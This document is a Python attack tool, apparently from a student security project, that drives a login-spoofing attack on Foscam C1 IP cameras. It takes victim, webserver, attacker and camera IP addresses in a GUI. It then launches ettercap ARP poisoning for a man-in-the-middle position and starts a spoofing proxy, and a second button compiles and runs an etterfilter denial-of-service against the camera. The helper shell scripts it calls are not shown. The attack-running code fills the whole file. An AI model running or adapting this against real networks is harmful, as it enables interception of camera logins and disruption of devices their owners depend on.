# Combined script used for login spoofing the Foscam C1
#
# Authors: Sam Nijsten, Lorik Heijnen, Jeroen Hellenbrand
# Date: 11/06/2021

# Import modules
import PySimpleGUI as g
import os
from multiprocessing import Process
import time

def execute():
    # Define GUI
    window = g.FlexForm('Foscam C1 Login Spoofing')

    # Add layout elements
    layout = [
        [g.Text('Please enter the corresponding IP addresses')],
        [g.Text('Victim IP', size=(15, 1)), g.InputText('192.168.56.0')],
        [g.Text('Webserver IP', size=(15, 1)), g.InputText('192.168.56.0')],
        [g.Text('Attacker IP', size=(15, 1)), g.InputText('192.168.56.0')],
        [g.Text('Foscam C1 IP', size=(15, 1)), g.InputText('192.168.56.255')],
        [g.Submit('Login Spoof'), g.Cancel('DoS')]
    ]

    # Retrieve layout elements
    button, values = window.Layout(layout).Read()

    # Set the IP addresses as global variables
    global ipc, ipw
    ipc = values[3]
    ipw = values[1]

    # Check the value of the button
    if button == 'DoS':
        print('DoS starting...')

        # Generate the DoS script
        os.system('chmod +x dos.sh')
        generate = './dos.sh ' + values[3]
        os.system(generate)

        # Compile the DoS script
        compileDoS = 'etterfilter dos.elt -o dos.ef'
        os.system(compileDoS)

        # Execute the DoS script
        os.system('chmod +x dosExecute.sh')
        executeDoS = './dosExecute.sh ' + values[3]
        os.system(executeDoS)

        return

    # Create request.py
    os.system('chmod +x generate.sh')
    generate = './generate.sh ' + values[3] + ' ' + values[1]
    os.system(generate)

    # Compile and run the shell code (ARP Poisoning via ettercap)
    os.system('chmod +x execute.sh')
    os.system('chmod +x executeProxy.sh')

    global cmd , cmd2
    cmd = './execute.sh ' + values[0] + ' ' + values[3]
    cmd2 = './executeProxy.sh ' + values[2]

    # Start the attack in Multithreading
    p1 = Process(target=func1)
    p1.start()
    p2 = Process(target=func2)
    p2.start()
    p1.join()
    p2.join()

# Function to run the ARP MiTM
def func1():
    os.system(cmd)

# Function for running the Proxy server
def func2():
    #Wait for ARP MiTM to be finished
    time.sleep(5)
    os.system(cmd2)

# Run the script
if __name__ == '__main__':
    execute()
